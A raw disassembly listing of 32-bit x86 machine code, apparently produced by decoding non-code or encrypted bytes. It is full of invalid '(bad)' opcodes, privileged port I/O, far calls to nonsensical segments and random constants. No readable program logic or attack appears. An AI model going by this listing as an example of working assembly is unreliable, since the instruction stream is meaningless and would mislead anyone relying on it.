  4106e6:	ror    DWORD PTR [ecx-0x3a],0xe2
  4106ea:	leave  
  4106eb:	pop    ecx
  4106ec:	div    esp
  4106ee:	sub    DWORD PTR [esi-0x6c],esi
  4106f1:	retf   0x1215
  4106f4:	mov    ?,WORD PTR [edi+0x53]
  4106f7:	(bad)  
  4106f8:	stc    
  4106f9:	retf   
  4106fa:	ret    0x55cf
  4106fd:	xchg   edi,eax
  4106fe:	aad    0xd
  410700:	lock mov edi,0xdb0cf6e4
  410706:	pop    edx
  410707:	push   ebp
  410708:	sub    BYTE PTR [esi+0x4e],dl
  41070b:	xchg   esi,eax
  41070c:	scas   eax,DWORD PTR es:[edi]
  41070d:	(bad)  [esp+edi*2]
  410710:	rcl    BYTE PTR [ecx+0x20b6e627],cl
  410716:	xchg   edi,eax
  410717:	lock mov bh,0x81
  41071a:	xchg   sp,ax
  41071c:	mov    al,0x15
  41071e:	shl    eax,0xce
  410721:	bound  edx,QWORD PTR [edi]
  410723:	push   edi
  410724:	cli    
  410725:	sbb    DWORD PTR [eax+0x4ec2992f],esi
  41072b:	(bad)  
  41072d:	les    esp,FWORD PTR [edi-0x2e3cbfa3]
  410733:	mov    ?,edx
  410735:	sbb    bl,BYTE PTR [edi-0x48]
  410738:	das    
  410739:	fld    TBYTE PTR [edx]
  41073b:	push   esp
  41073c:	inc    edi
  41073d:	rcl    DWORD PTR [esi],1
  41073f:	test   DWORD PTR [esi-0x1c6ce1b8],0x53ba4472
  410749:	sahf   
  41074a:	or     bh,BYTE PTR [ebp+edx*8+0x3d]
  41074e:	clc    
  41074f:	stos   DWORD PTR es:[edi],eax
  410750:	pand   mm4,QWORD PTR [ebp+0x58]
  410754:	into   
  410755:	aad    0x9
  410757:	ja     0x4106d9
  410759:	fstp   DWORD PTR [ebx-0x6e]
  41075c:	add    ah,BYTE PTR [edi+edx*1]
  41075f:	mov    edx,0xdd70c174
  410764:	xlat   BYTE PTR ds:[ebx]
  410765:	jb     0x4106f6
  410767:	xchg   ebx,eax
  410768:	into   
  410769:	(bad)  
  41076a:	aam    0x7b
  41076c:	xchg   BYTE PTR [edi],cl
  41076e:	lods   al,BYTE PTR ds:[si]
  410770:	pop    es
  410771:	xchg   esp,eax
  410772:	pop    esp
  410773:	pop    ebp
  410774:	sti    
  410775:	pop    ecx
  410776:	jl     0x41079c
  410778:	xchg   ebx,eax
  410779:	xor    ebp,DWORD PTR [edi-0x7a]
  41077c:	mov    ch,0x3
  41077e:	rol    DWORD PTR [eax-0x405d3ea7],1
  410784:	mov    ds:0xf08af8e7,al
  410789:	mov    al,0xf2
  41078b:	xor    BYTE PTR [eax+0x64],dl
  41078e:	popa   
  41078f:	std    
  410790:	enter  0xc83,0x5e
  410794:	(bad)  
  410796:	xchg   BYTE PTR [edi],dl
  410798:	pop    ebx
  410799:	dec    edx
  41079a:	mov    cl,0x13
  41079c:	sbb    al,0xf9
  41079e:	scas   eax,DWORD PTR es:[edi]
  41079f:	pop    edi
  4107a0:	jp     0x410797
  4107a2:	pop    edx
  4107a3:	mov    al,ds:0xb68a29d5
  4107a8:	push   edx
  4107a9:	cmp    eax,0xfcde9c72
  4107ae:	jnp    0x4107cb
  4107b0:	das    
  4107b1:	scas   al,BYTE PTR es:[edi]
  4107b2:	fidiv  DWORD PTR [ebx-0x2d]
  4107b5:	fsubr  QWORD PTR ds:0xeac04551
  4107bb:	lock and al,0xbf
  4107be:	in     eax,0x12
  4107c0:	xchg   edx,eax
  4107c1:	or     eax,0xe14725e0
  4107c6:	loop   0x41074e
  4107c8:	mov    dl,0x5c
  4107ca:	push   0xffffffcf
  4107cc:	adc    dh,BYTE PTR [edi-0x67fb315b]
  4107d2:	or     dh,bh
  4107d4:	pop    esi
  4107d5:	es inc esp
  4107d7:	mov    al,0x97
  4107d9:	ret    0xf179
  4107dc:	loope  0x41077a
  4107de:	les    edx,FWORD PTR [eax-0x74]
  4107e1:	imul   DWORD PTR [ebx]
  4107e3:	jnp    0x4107cd
  4107e5:	dec    esp
  4107e6:	mov    ah,0x47
  4107e8:	popf   
  4107e9:	pop    edx
  4107ea:	mov    esp,0xf61ef1d
  4107ef:	clc    
  4107f0:	xchg   ebp,eax
  4107f1:	fisub  DWORD PTR [edi-0x28]
  4107f4:	mov    edi,0x6d52e8e9
  4107f9:	ss mov ebx,0x29d50f6
  4107ff:	dec    ebx
  410800:	stos   DWORD PTR es:[edi],eax
  410801:	(bad)  
  410802:	(bad)  
  410803:	outs   dx,DWORD PTR ds:[esi]
  410804:	ja     0x4107d6
  410806:	jae    0x410821
  410808:	cmp    BYTE PTR [edx+edi*2+0x19],bh
  41080c:	push   esp
  41080d:	add    al,0x13
  41080f:	dec    ecx
  410810:	sub    edi,DWORD PTR [ebx]
  410812:	in     al,0x91
  410814:	mov    ebx,0x624fc5e3
  410819:	ficomp DWORD PTR [edi+0x3cf71712]
  41081f:	mov    bl,0xf
  410821:	sti    
  410822:	adc    al,0x7e
  410824:	add    DWORD PTR [esi-0x7c],esi
  410827:	dec    esp
  410828:	add    al,0x15
  41082a:	pop    ds
  41082b:	iret   
  41082c:	(bad)  
  41082d:	hlt    
  41082e:	cwde   
  41082f:	push   edx
  410830:	or     ch,BYTE PTR [edi]
  410832:	fst    st(6)
  410834:	pushf  
  410835:	inc    edx
  410836:	out    dx,eax
  410837:	sbb    DWORD PTR [edx-0x11681fde],0xa5189177
  410841:	cmc    
  410842:	lds    esi,FWORD PTR [ebp+0x352eb31f]
  410848:	in     al,dx
  410849:	push   edi
  41084a:	or     BYTE PTR [eax],0x3d
  41084d:	stos   BYTE PTR es:[edi],al
  41084e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41084f:	mov    ebx,0x4e33798
  410854:	and    DWORD PTR [eax+0x3943e09a],ebp
  41085a:	sbb    al,0x61
  41085c:	mov    edi,0x85544fc1
  410861:	int3   
  410862:	jno    0x4108bb
  410864:	outs   dx,BYTE PTR ds:[esi]
  410865:	xchg   ebp,eax
  410866:	das    
  410867:	add    BYTE PTR [esp+edi*8-0x2d],cl
  41086b:	push   edx
  41086c:	test   eax,0xb2c56ad1
  410871:	dec    edi
  410872:	test   DWORD PTR [ebp+0x3d],ecx
  410875:	and    ecx,esi
  410877:	rep lods eax,DWORD PTR ds:[esi]
  410879:	fimul  DWORD PTR [eax-0x7bc2f2b3]
  41087f:	fistp  QWORD PTR [eax-0x12af3424]
  410885:	cmp    BYTE PTR [edi],ah
  410887:	adc    ecx,DWORD PTR [edx]
  410889:	enter  0x5564,0x9e
  41088d:	mov    ebx,0x7f79d7bf
  410892:	or     BYTE PTR [eax+0x6],0x61
  410896:	cwde   
  410897:	cmp    al,0x9c
  410899:	int    0xac
  41089b:	loopne 0x41085c
  41089d:	pop    edi
  41089e:	sti    
  41089f:	ret    
  4108a0:	mov    ch,0xba
  4108a2:	inc    esp
  4108a3:	and    al,0x2a
  4108a5:	or     ebp,DWORD PTR [esp+edx*2]
  4108a8:	call   0x1201:0xa743ab5e
  4108af:	cmc    
  4108b0:	cmp    eax,DWORD PTR [eax-0x5]
  4108b3:	or     al,0x13
  4108b5:	push   0x2a122958
  4108ba:	bound  ebp,QWORD PTR [esi-0x1f]
  4108bd:	inc    BYTE PTR [ecx]
  4108bf:	xchg   edi,eax
  4108c0:	push   ebp
  4108c1:	mov    BYTE PTR [ebx+edi*4-0x66],cl
  4108c5:	js     0x4108c8
  4108c7:	adc    BYTE PTR [ebp-0x50],bh
  4108ca:	outs   dx,DWORD PTR ds:[esi]
  4108cb:	div    DWORD PTR ds:0xbf48
  4108d0:	adc    eax,0x4bc6a0fc
  4108d5:	mov    eax,DWORD PTR [edx+0x76]
  4108d8:	cmp    al,0x3e
  4108da:	inc    esp
  4108db:	ret    
  4108dc:	mov    dl,0xf
  4108de:	pop    ebp
  4108df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4108e0:	and    cl,BYTE PTR [esi-0x542ab06e]
  4108e6:	popa   
  4108e7:	into   
  4108e8:	and    edi,DWORD PTR [edx]
  4108ea:	ror    DWORD PTR [ebp-0x1c],0xe
  4108ee:	mov    ebx,0x56e6f926
  4108f3:	rcl    ebp,cl
  4108f5:	or     DWORD PTR [edi],0xebd4c138
  4108fb:	mov    dl,0x5c
  4108fd:	jbe    0x4108d9
  4108ff:	sbb    BYTE PTR [ecx],al
  410901:	data16 sti 
  410903:	addr16 jle 0x410967
  410906:	out    0x83,al
  410908:	or     eax,DWORD PTR [edx-0x9]
  41090b:	ffree  st(7)
  41090d:	xchg   esi,eax
  41090e:	pop    ds
  41090f:	fld    QWORD PTR [ecx+0x4f]
  410912:	inc    ebx
  410913:	sbb    BYTE PTR [eax+0x6df3a035],bl
  410919:	aam    0x22
  41091b:	xchg   ebp,eax
  41091c:	cs push ss
  41091e:	stos   DWORD PTR es:[edi],eax
  41091f:	xlat   BYTE PTR ds:[ebx]
  410920:	rol    BYTE PTR [esi],cl
  410922:	(bad)  
  410923:	shl    BYTE PTR [esi-0x6e],cl
  410926:	pop    esi
  410927:	ja     0x41097d
  410929:	adc    BYTE PTR [edx+0x8],bl
  41092c:	inc    edi
  41092d:	adc    al,0x50
  41092f:	scas   al,BYTE PTR es:[edi]
  410930:	jb     0x4108b2
  410932:	xor    DWORD PTR [esp+eax*1+0x5bfe28b3],0x5d
  41093a:	inc    esp
  41093b:	imul   esi,DWORD PTR [edx+0x2d],0xe4e4b75c
  410942:	dec    ecx
  410943:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410944:	aaa    
  410945:	sbb    eax,0xc4889895
  41094a:	and    eax,0x3533cbaa
  41094f:	sti    
  410950:	not    BYTE PTR [esi-0x30749743]
  410956:	adc    eax,0xa37a07ab
  41095b:	pushf  
  41095c:	xlat   BYTE PTR ds:[ebx]
  41095d:	mov    al,0x10
  41095f:	test   dh,bh
  410961:	xor    eax,0x25008fe6
  410966:	mov    bh,bl
  410968:	xor    bh,BYTE PTR [eax+0x1e56830b]
  41096e:	push   0x35da92d4
  410973:	and    ch,0xc5
  410976:	retf   0x27ea
  410979:	cmc    
  41097a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41097b:	mov    al,ds:0x9f2dfcfb
  410980:	pop    es
  410981:	js     0x410971
  410983:	dec    ecx
  410984:	sbb    eax,0x1c65126c
  410989:	ins    DWORD PTR es:[edi],dx
  41098a:	lock daa 
  41098c:	jo     0x410910
  41098e:	pop    esp
  41098f:	cmp    bl,cl
  410991:	pop    edx
  410992:	mov    dh,0x79
  410994:	push   cs
  410995:	(bad)  
  410996:	push   ds
  410997:	test   al,0x67
  410999:	ret    
  41099a:	xor    ebx,DWORD PTR [esi+0x3861e9bf]
  4109a0:	and    dl,BYTE PTR [ecx]
  4109a2:	enter  0xae39,0x46
  4109a6:	add    DWORD PTR [eax+0x282806b4],esi
  4109ac:	add    esi,DWORD PTR [ecx-0x1e]
  4109af:	in     eax,0x16
  4109b1:	or     BYTE PTR [edi-0x7fd45874],0x80
  4109b8:	cmp    eax,0xa0f6361
  4109bd:	test   BYTE PTR [ecx],dh
  4109bf:	adc    DWORD PTR [ebp-0x6793d4ee],ebx
  4109c5:	popf   
  4109c6:	fstp   DWORD PTR [eax+0x7e9dd64c]
  4109cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4109cd:	call   0x102a6f4
  4109d2:	cwde   
  4109d3:	rcl    BYTE PTR [esi+0x44934c0e],1
  4109d9:	(bad)  
  4109da:	scas   eax,DWORD PTR es:[edi]
  4109db:	repz jae 0x4109f3
  4109de:	pop    edx
  4109df:	or     eax,0xa654ae5d
  4109e4:	inc    ecx
  4109e5:	xor    eax,DWORD PTR [ecx+0xeedb9d7]
  4109eb:	mov    eax,ds:0x294040e5
  4109f0:	nop
  4109f1:	ins    BYTE PTR es:[edi],dx
  4109f2:	(bad)  
  4109f3:	test   eax,0x2bc5e141
  4109f8:	pusha  
  4109f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4109fa:	test   eax,0x3277eb2
  4109ff:	mov    es,ebp
  410a01:	outs   dx,DWORD PTR ds:[esi]
  410a02:	mov    ebp,0x8a1ba498
  410a07:	or     esp,0x66cdda97
  410a0d:	and    esi,DWORD PTR ds:0x7724b6af
  410a13:	or     bl,al
  410a15:	in     eax,0xd
  410a17:	mov    al,ds:0x53e5959d
  410a1c:	or     dh,bh
  410a1e:	in     eax,0x3c
  410a20:	stc    
  410a21:	(bad)  
  410a24:	cmp    BYTE PTR [eax-0x29],0xc
  410a28:	(bad)  [edx+0x52]
  410a2b:	arpl   WORD PTR [esi],ax
  410a2d:	out    0x6b,al
  410a2f:	cli    
  410a30:	fmul   st,st(1)
  410a32:	mov    edi,0x49da2669
  410a37:	dec    edx
  410a38:	lea    eax,[ebp-0x3e]
  410a3b:	or     BYTE PTR [edx-0x7c5aadb2],ah
  410a41:	xchg   edi,eax
  410a42:	cwde   
  410a43:	pop    eax
  410a44:	(bad)  
  410a45:	sub    esi,DWORD PTR ds:0x8cd1491
  410a4b:	and    al,0x78
  410a4d:	inc    esp
  410a4e:	cmp    DWORD PTR [eax],0x8c10de8e
  410a54:	cmp    bl,al
  410a56:	dec    eax
  410a57:	enter  0x25c3,0x3d
  410a5b:	ret    0x3148
  410a5e:	(bad)  
  410a5f:	fdiv   st(3),st
  410a61:	jne    0x410a14
  410a63:	ficom  DWORD PTR [eax]
  410a65:	mov    eax,0x16f73aa5
  410a6a:	sub    ah,bh
  410a6c:	(bad)  
  410a6d:	sar    BYTE PTR [edi+0x17],1
  410a70:	scas   eax,DWORD PTR es:[edi]
  410a71:	ror    DWORD PTR [edi],1
  410a73:	out    dx,al
  410a74:	and    ecx,DWORD PTR [ecx]
  410a76:	fild   WORD PTR [edi-0x4a0b4e6]
  410a7c:	ficomp DWORD PTR [edi+0x5e]
  410a7f:	cs gs popa 
  410a82:	mov    BYTE PTR [eax-0xc],bh
  410a85:	push   edx
  410a86:	cmp    al,0xa8
  410a88:	jo     0x410aff
  410a8a:	pop    es
  410a8b:	and    DWORD PTR [edi+0x403aee43],esi
  410a91:	dec    ebp
  410a92:	xchg   edi,eax
  410a93:	addr16 jne 0x410afb
  410a96:	repz mov ecx,0xcd4d5ed0
  410a9d:	cli    
  410a9e:	jo     0x410aa9
  410aa0:	xor    al,0x0
  410aa2:	aaa    
  410aa3:	jbe    0x410a96
  410aa5:	call   0xf2c34b0b
  410aaa:	sub    BYTE PTR [ebx],al
  410aac:	fist   WORD PTR [edx+0x2f7cbfaf]
  410ab2:	test   eax,0x32ef39d9
  410ab7:	xor    eax,0xddd1fb95
  410abc:	xor    dh,BYTE PTR [ecx-0x7]
  410abf:	mov    dl,0x5e
  410ac1:	ret    0xd5ab
  410ac4:	fstp   QWORD PTR [eax+ebx*2]
  410ac7:	sar    esp,1
  410ac9:	mov    edi,DWORD PTR [edi+edx*4]
  410acc:	imul   ebx,DWORD PTR [ebx],0x5c933746
  410ad2:	jg     0x410a68
  410ad4:	les    ebx,FWORD PTR [ecx+0xee4a7f3]
  410ada:	mov    edx,0xc87b9878
  410adf:	inc    ebp
  410ae0:	pop    ebp
  410ae1:	inc    ecx
  410ae2:	cmc    
  410ae3:	clc    
  410ae4:	test   BYTE PTR [esi+0x63],al
  410ae7:	rol    BYTE PTR [edx],cl
  410ae9:	(bad)  
  410aea:	popf   
  410aeb:	inc    edi
  410aec:	adc    DWORD PTR [esi+0x31],ebp
  410aef:	jl     0x410adf
  410af1:	pop    esi
  410af2:	mov    ebx,DWORD PTR [esi+0x7]
  410af5:	cmp    DWORD PTR [ebp+0x3f7d801d],esi
  410afb:	adc    cl,BYTE PTR [eax+0x79156de8]
  410b01:	adc    al,0x90
  410b03:	or     eax,0x9eed6076
  410b08:	daa    
  410b09:	pushf  
  410b0a:	les    ebx,FWORD PTR [edi+0xb]
  410b0d:	dec    esp
  410b0e:	sub    DWORD PTR [eax],ebp
  410b10:	mov    BYTE PTR [esi],dh
  410b12:	popf   
  410b13:	imul   cl
  410b15:	cdq    
  410b16:	xchg   ebp,eax
  410b17:	test   BYTE PTR fs:[ecx+0x39],bh
  410b1b:	mov    ah,BYTE PTR [ebp+0x43c7bb]
  410b21:	(bad)  
  410b22:	mov    dl,0x94
  410b24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b25:	pop    ebx
  410b26:	push   ds
  410b27:	and    al,0xfb
  410b29:	add    bl,bl
  410b2b:	shl    BYTE PTR [edi+0x53],cl
  410b2e:	pop    edx
  410b2f:	imul   ecx,DWORD PTR [ecx-0x3bbd96a4],0x145e0287
  410b39:	je     0x410ac0
  410b3b:	je     0x410b29
  410b3d:	(bad)  
  410b3e:	cs popf 
  410b40:	jno    0x410b82
  410b42:	std    
  410b43:	outs   dx,BYTE PTR ds:[esi]
  410b44:	jmp    0x410b4f
  410b46:	pop    edx
  410b47:	or     al,0xa2
  410b49:	mov    bl,0x94
  410b4b:	add    esi,ebp
  410b4d:	cwde   
  410b4e:	add    DWORD PTR [eax-0x13c66575],esp
  410b54:	cmp    DWORD PTR [esp+ebp*8-0x47596233],ebx
  410b5b:	jnp    0x410ae8
  410b5d:	sub    al,dh
  410b5f:	add    eax,0x76301614
  410b64:	pop    eax
  410b65:	add    ah,BYTE PTR [edx]
  410b67:	inc    ecx
  410b68:	mov    ebx,edi
  410b6a:	aaa    
  410b6b:	int3   
  410b6c:	sub    eax,0xbcc5981
  410b71:	pop    eax
  410b72:	repnz xor al,0x36
  410b75:	xchg   ebp,eax
  410b76:	into   
  410b77:	outs   dx,DWORD PTR ds:[esi]
  410b78:	adc    al,0x9f
  410b7a:	retf   
  410b7b:	pop    ss
  410b7c:	cmp    eax,edx
  410b7e:	add    bl,dl
  410b80:	sbb    edi,eax
  410b82:	call   0xf0abd4f6
  410b87:	cmp    al,0x54
  410b89:	cmp    eax,0x5e38b611
  410b8e:	jg     0x410b9e
  410b90:	xchg   ecx,eax
  410b91:	push   cs
  410b92:	int3   
  410b93:	push   cs
  410b94:	lea    eax,[esi+0x12]
  410b97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b98:	loop   0x410b90
  410b9a:	cli    
  410b9b:	clc    
  410b9c:	fisub  DWORD PTR [ebx-0xfdfe9f]
  410ba2:	out    dx,al
  410ba3:	or     BYTE PTR [edi+0x44fd520c],bh
  410ba9:	ret    
  410baa:	lahf   
  410bab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410bac:	mov    BYTE PTR [ecx-0x64],dl
  410baf:	xor    DWORD PTR [edx-0x39],eax
  410bb2:	jnp    0x410b38
  410bb4:	sub    ecx,DWORD PTR [edx-0x414b85f2]
  410bba:	daa    
  410bbb:	pop    edx
  410bbc:	jns    0x410b77
  410bbe:	mov    al,0xa2
  410bc0:	ins    DWORD PTR es:[edi],dx
  410bc1:	xor    eax,0x193fce25
  410bc6:	out    0x6f,al
  410bc8:	addr16 jl 0x410bfc
  410bcb:	add    DWORD PTR [ebx],ebp
  410bcd:	test   BYTE PTR [ebp+eiz*8+0x6ff7d15f],dh
  410bd4:	daa    
  410bd5:	jb     0x410b5a
  410bd7:	jns    0x410c00
  410bd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410bda:	and    eax,0x873104c3
  410bdf:	inc    edx
  410be0:	cs jae 0x410ba0
  410be3:	xchg   ah,dl
  410be5:	dec    ebx
  410be6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410be7:	add    al,0x5
  410be9:	mov    fs,WORD PTR [ebp-0x2a]
  410bec:	sbb    al,0x36
  410bee:	call   0x4bc:0x1de849f0
  410bf5:	inc    eax
  410bf6:	xor    bl,cl
  410bf8:	call   0xaf341a12
  410bfd:	sbb    ebp,ecx
  410bff:	mov    edx,0x75f06caa
  410c04:	sbb    eax,0x8e82fe3
  410c09:	cli    
  410c0a:	in     eax,0x79
  410c0c:	test   eax,0xbcadc759
  410c11:	lea    edx,[ebp+eax*4-0xa]
  410c15:	sbb    eax,0x785ade7b
  410c1a:	jnp    0x410c7a
  410c1c:	mul    BYTE PTR [ecx+ebx*8+0x72]
  410c20:	xor    al,0xa7
  410c22:	lds    esp,FWORD PTR [edx+ecx*2+0x22]
  410c26:	push   ebx
  410c27:	int3   
  410c28:	retf   
  410c29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410c2a:	sub    dl,BYTE PTR [ebx+0x4cfdd115]
  410c30:	xchg   ecx,eax
  410c31:	shl    esp,0x4a
  410c34:	in     eax,0x68
  410c36:	push   cs
  410c37:	sbb    dh,BYTE PTR [edx-0x43]
  410c3a:	add    al,0xe3
  410c3c:	ins    BYTE PTR es:[edi],dx
  410c3d:	das    
  410c3e:	mov    ch,0x98
  410c40:	ss jno 0x410c4c
  410c43:	mov    bl,BYTE PTR [ecx+0x36d8954c]
  410c49:	xchg   ebp,eax
  410c4a:	jl     0x410bdd
  410c4c:	xchg   esp,eax
  410c4d:	sub    DWORD PTR [eax+0x21f4f275],0x3c
  410c54:	xchg   edi,eax
  410c55:	stos   BYTE PTR es:[edi],al
  410c56:	or     eax,0xd046255c
  410c5b:	sbb    al,0xca
  410c5d:	icebp  
  410c5e:	mov    ch,0xc7
  410c60:	sbb    al,0x97
  410c62:	bound  ebp,QWORD PTR [ebp-0x20e02dc]
  410c68:	call   0xa63d:0xce6e9de3
  410c6f:	or     al,0xc8
  410c71:	ja     0x410c0b
  410c73:	das    
  410c74:	pop    edx
  410c75:	mov    dh,BYTE PTR [esi]
  410c77:	jbe    0x410c1e
  410c79:	daa    
  410c7a:	mov    es,ebx
  410c7c:	cmp    bh,BYTE PTR [edx]
  410c7e:	push   ebp
  410c7f:	jo     0x410cdb
  410c81:	xor    ebx,DWORD PTR [ebx]
  410c83:	or     dl,BYTE PTR [esi]
  410c85:	adc    DWORD PTR [edi+0x1a],ecx
  410c88:	arpl   WORD PTR [ebp+0x66a92c6f],dx
  410c8e:	paddusb mm7,QWORD PTR [ebx+0x7f]
  410c92:	test   BYTE PTR [edi+0x367054d0],al
  410c98:	in     al,0x29
  410c9a:	jae    0x410cd2
  410c9c:	push   edx
  410c9d:	jl     0x410cc7
  410c9f:	not    DWORD PTR ds:0x51441544
  410ca5:	adc    edx,DWORD PTR ds:0x1e19d42a
  410cab:	mov    al,0x67
  410cad:	cmp    al,0xb9
  410caf:	mov    edx,0x97652c13
  410cb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410cb5:	inc    esi
  410cb6:	js     0x410cb3
  410cb8:	adc    DWORD PTR [edi],ebp
  410cba:	push   ecx
  410cbb:	js     0x410cd3
  410cbd:	test   eax,0x9cea63c7
  410cc2:	mov    ds,WORD PTR [ebx+0x73]
  410cc5:	dec    edi
  410cc6:	sbb    BYTE PTR [ebx-0x2613cc83],dl
  410ccc:	dec    eax
  410ccd:	jno    0x410c72
  410ccf:	adc    bl,BYTE PTR [esi+ebx*2-0x22]
  410cd3:	rcl    dl,cl
  410cd5:	xchg   edi,eax
  410cd6:	rcr    BYTE PTR [ecx-0x7e],1
  410cd9:	mov    esi,DWORD PTR [edi]
  410cdb:	and    al,0x63
  410cdd:	stos   BYTE PTR es:[edi],al
  410cde:	ins    BYTE PTR es:[edi],dx
  410cdf:	fidiv  WORD PTR [edx+esi*8+0x103c4e6c]
  410ce6:	repz fcomp DWORD PTR [edi-0x1e]
  410cea:	(bad)  
  410cec:	add    ah,BYTE PTR [ecx-0x17f08f56]
  410cf2:	movaps xmm0,XMMWORD PTR [ecx+0x1a]
  410cf6:	jge    0x410d5d
  410cf8:	(bad)  
  410cf9:	and    eax,0xa7020eff
  410cfe:	into   
  410cff:	fwait
  410d00:	inc    esp
  410d01:	and    al,dl
  410d03:	(bad)  [ebx+ebp*2+0x29]
  410d07:	cmp    dh,bh
  410d09:	push   esp
  410d0a:	mov    bl,al
  410d0c:	jns    0x410d4e
  410d0e:	stos   BYTE PTR es:[edi],al
  410d0f:	pop    es
  410d10:	cdq    
  410d11:	pop    ss
  410d12:	mov    esp,0x794e3a7b
  410d17:	xchg   DWORD PTR [ecx+0x294e82ac],ebx
  410d1d:	xchg   DWORD PTR ds:0xc6ac077,edi
  410d23:	jo     0x410d04
  410d25:	dec    ebx
  410d26:	enter  0x7a3a,0x5
  410d2a:	mov    al,ds:0x750cab73
  410d2f:	jbe    0x410d9d
  410d31:	(bad)  
  410d33:	jle    0x410d17
  410d35:	sbb    DWORD PTR [esi-0x7b],esi
  410d38:	stos   DWORD PTR es:[edi],eax
  410d39:	xor    ebx,ebx
  410d3b:	jl     0x410cf8
  410d3d:	adc    BYTE PTR [eax+0x5f69f4cc],cl
  410d43:	push   0xb4a0881b
  410d48:	and    BYTE PTR [eax],cl
  410d4a:	mov    al,0xaf
  410d4c:	out    0x15,eax
  410d4e:	ret    
  410d4f:	adc    dh,BYTE PTR [ecx*8-0x643dd2b2]
  410d56:	mov    cl,0xac
  410d58:	cmp    al,BYTE PTR es:[esi+ecx*4]
  410d5c:	mov    WORD PTR [esi],gs
  410d5e:	mov    bh,0xa9
  410d60:	xchg   edi,eax
  410d62:	fwait
  410d63:	push   ds
  410d64:	add    eax,0x5572e5ce
  410d69:	cmp    al,cl
  410d6b:	int    0x8
  410d6d:	cmp    eax,0x4
  410d70:	mov    al,0xe8
  410d72:	xor    DWORD PTR [ebp+0x1e],eax
  410d75:	xchg   BYTE PTR [edx+0xb],ch
  410d78:	mov    WORD PTR [ebx],?
  410d7a:	aaa    
  410d7b:	inc    esp
  410d7c:	pop    edi
  410d7d:	push   0xffffffb6
  410d7f:	inc    ebx
  410d80:	dec    esi
  410d81:	sbb    al,BYTE PTR [ecx]
  410d83:	repz cmp BYTE PTR [eax-0x233b2c1c],dh
  410d8a:	les    esi,FWORD PTR [edx+eax*1-0x5a]
  410d8e:	shl    BYTE PTR [edx+0x2fdeace2],cl
  410d94:	rcl    BYTE PTR [ecx+0x7d2d2032],1
  410d9a:	ror    DWORD PTR [esi+0x2dd0773a],cl
  410da0:	mov    ebx,gs
  410da2:	and    DWORD PTR [esi],esi
  410da4:	pushf  
  410da5:	imul   esp,DWORD PTR [ebx],0x9d88fc2f
  410dab:	or     dl,ch
  410dad:	jle    0x410de0
  410daf:	jns    0x410d3f
  410db1:	adc    BYTE PTR [eax-0x6d1ccfe5],bl
  410db7:	cmc    
  410db8:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  410dba:	popf   
  410dbb:	(bad)  
  410dbc:	push   cs
  410dbd:	xor    al,BYTE PTR [esi]
  410dbf:	adc    DWORD PTR [edi-0x4eeae196],ebx
  410dc5:	push   edx
  410dc6:	mov    ds:0x5d4b72c4,eax
  410dcb:	push   edi
  410dcc:	inc    eax
  410dcd:	repnz pop ebx
  410dcf:	add    esp,esi
  410dd1:	rcl    DWORD PTR ds:0xa9b45804,1
  410dd7:	add    eax,0xffffffb7
  410dda:	xchg   ebx,eax
  410ddb:	adc    cl,dl
  410ddd:	cmp    esi,DWORD PTR [esi+0x19]
  410de0:	stos   DWORD PTR es:[edi],eax
  410de1:	dec    ebx
  410de2:	cmp    BYTE PTR [edx-0x1270af4e],dh
  410de8:	shl    DWORD PTR [eax],0x10
  410deb:	jecxz  0x410db5
  410ded:	(bad)  
  410dee:	pop    es
  410def:	mov    ebx,0xb152d2a2
  410df4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410df5:	add    al,0x61
  410df7:	outs   dx,DWORD PTR ds:[esi]
  410df8:	enter  0x935b,0xe1
  410dfc:	pop    ebx
  410dfd:	pop    eax
  410dfe:	mov    WORD PTR [edx],fs
  410e00:	hlt    
  410e01:	and    al,0xe3
  410e03:	ins    DWORD PTR es:[edi],dx
  410e04:	test   al,0xf4
  410e06:	xchg   esp,eax
  410e07:	inc    ebx
  410e08:	sub    eax,0xe992da56
  410e0d:	clc    
  410e0e:	out    dx,eax
  410e0f:	dec    edi
  410e10:	or     al,bh
  410e12:	mov    ds:0xd01b17ab,eax
  410e17:	mov    ebp,0x4b297a78
  410e1c:	fdiv   DWORD PTR [eax+0x40]
  410e1f:	enter  0xe672,0xb9
  410e23:	inc    ebp
  410e24:	and    BYTE PTR [edi-0x3e61007d],0x64
  410e2b:	jb     0x410e5c
  410e2d:	mov    cl,0x75
  410e2f:	pop    ecx
  410e30:	sbb    BYTE PTR [edx-0x7294d369],0x82
  410e37:	enter  0xc1b1,0x8b
  410e3b:	pop    esp
  410e3c:	jecxz  0x410eb3
  410e3e:	fild   WORD PTR [eax]
  410e40:	sub    esp,0x26afee71
  410e46:	or     al,0x68
  410e48:	bound  esp,QWORD PTR [ebp-0x70]
  410e4b:	inc    ebx
  410e4c:	inc    esi
  410e4d:	and    ebp,DWORD PTR [ebx+0x70e6987d]
  410e53:	mov    WORD PTR [ecx],ds
  410e55:	xchg   ebp,eax
  410e56:	jecxz  0x410eae
  410e58:	or     eax,esp
  410e5a:	lods   eax,DWORD PTR ds:[esi]
  410e5b:	hlt    
  410e5c:	fdiv   DWORD PTR [ebp-0x15]
  410e5f:	sub    BYTE PTR [edi-0x7d],ah
  410e62:	add    DWORD PTR [ebx],edi
  410e64:	pusha  
  410e65:	cmc    
  410e66:	dec    eax
  410e67:	fld    TBYTE PTR [eax-0x7c]
  410e6a:	in     eax,0xe4
  410e6c:	cmp    ecx,DWORD PTR [edx]
  410e6e:	(bad)  
  410e6f:	es mov eax,0x9842bea9
  410e75:	fcom   st(6)
  410e77:	push   ebx
  410e78:	push   es
  410e79:	aas    
  410e7a:	push   eax
  410e7b:	cmp    ebx,DWORD PTR [edi]
  410e7d:	jle    0x410ed1
  410e7f:	fisubr WORD PTR [ecx]
